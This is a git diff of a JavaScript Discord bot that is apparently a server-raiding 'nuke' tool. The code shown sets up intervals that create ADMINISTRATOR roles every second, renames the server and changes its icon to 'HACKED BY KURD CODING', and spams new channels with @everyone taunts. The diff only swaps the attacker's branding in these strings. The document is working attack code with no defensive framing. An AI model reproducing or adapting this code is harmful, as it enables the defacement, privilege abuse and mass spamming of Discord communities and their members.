@@ -39,7 +39,7 @@ client.on('message', message => {
       
         setInterval(() => {
             message.guild.createRole({
-                name: "HACKED BY UNKNOW",
+                name: "HACKED BY KURD CODING",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
@@ -47,12 +47,12 @@ client.on('message', message => {
             })
         }, 1000);
         message.guild.setIcon("https://images-ext-2.discordapp.net/external/XQ3ma0vVczOTnGnwHuarnQ01YWiAleZACpdd0BctfPA/https/play-lh.googleusercontent.com/hxhQGvgSGD1cTZ1XAZoylrTvy5vo020km-5vtSuQr98uXaVVS-PaZdUqI5BEI_02MrA%3Dw412-h220-rw");
-        message.guild.setName('HACKED BY UNKNOW');
+        message.guild.setName('HACKED BY KURD CODING');
         setTimeout(function() {
             setInterval(() => {
           
-                message.guild.createChannel('HACKED BY UNKNOW', 'text').then(channel => {
-                channel.send('@everyone HACKRAWA LALAYAN NADYAR:joy: :joy: :joy:')
+                message.guild.createChannel('HACKED BY KURD CODING', 'text').then(channel => {
+                channel.send('@everyone HACKRAWA LALAYAN SAEWANI KURD CODING:joy: :joy: :joy:')
                
                 })
             }
